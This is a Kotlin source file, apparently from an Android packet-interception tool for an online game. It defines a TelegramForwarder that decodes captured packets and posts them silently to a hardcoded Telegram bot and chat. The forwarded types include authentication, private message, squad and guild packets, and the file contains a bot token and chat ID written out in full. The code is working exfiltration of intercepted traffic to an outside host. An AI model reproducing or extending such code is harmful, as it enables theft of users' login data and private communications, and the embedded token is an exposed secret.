package com.mossa.pro

import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

/**
 * يرسل الباكيتات المهمة تلقائياً على تليجرام.
 */
object TelegramForwarder {
    private const val TAG = "TgForward"

    // ← غيّر دي لو عايز
    private const val BOT_TOKEN = "8606976897:AAHyxR-08gO9XPXofaWrxEJP_iLQaZ7OkDU"
    private const val CHAT_ID = "6270180780"

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private val API = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"

    // ✅ الـ types المهمة للإرسال التلقائي — حسب طلبك
    private val AUTO_FORWARD_TYPES = setOf(
        "1200",   // MESSAGE
        "0500",   // GHOST (Squad)
        "0515",   // SQUAD
        "1215",   // GUILD
        "0300"    // AUTH
    )

    @Volatile var enabled = true

    fun maybeSend(info: PacketInfo) {
        if (!enabled) return
        if (info.type !in AUTO_FORWARD_TYPES) return

        // نجهّز الرسالة
        val msg = buildMessage(info)

        try {
            val json = JSONObject().apply {
                put("chat_id", CHAT_ID)
                put("text", msg.take(4000))
                put("parse_mode", "HTML")
                put("disable_notification", true)
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url(API).post(body).build()

            client.newCall(req).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.w(TAG, "send fail: ${e.message}")
                }
                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "err: ${e.message}")
        }
    }

    private fun buildMessage(p: PacketInfo): String {
        val sb = StringBuilder()
        val emoji = when (p.type) {
            "1200" -> "💬"
            "0500" -> "👻"
            "0515" -> "👥"
            "1215" -> "🛡️"
            "0300" -> "🔐"
            else -> "📦"
        }
        sb.append("<b>$emoji #${p.number} · ${p.type} (${PacketTypes.name(p.type)})</b>\n")
        sb.append("◀ ").append(p.direction).append("\n")
        sb.append("🕐 ").append(p.datetime).append("\n")
        sb.append("📏 ").append(p.hex.length / 2).append(" bytes\n")

        if (p.decoded != null) {
            sb.append("\n<b>Decoded:</b>\n<code>")
            sb.append(ProtobufDecoder.format(p.decoded).take(1000))
            sb.append("</code>")
        }

        return sb.toString()
    }
}
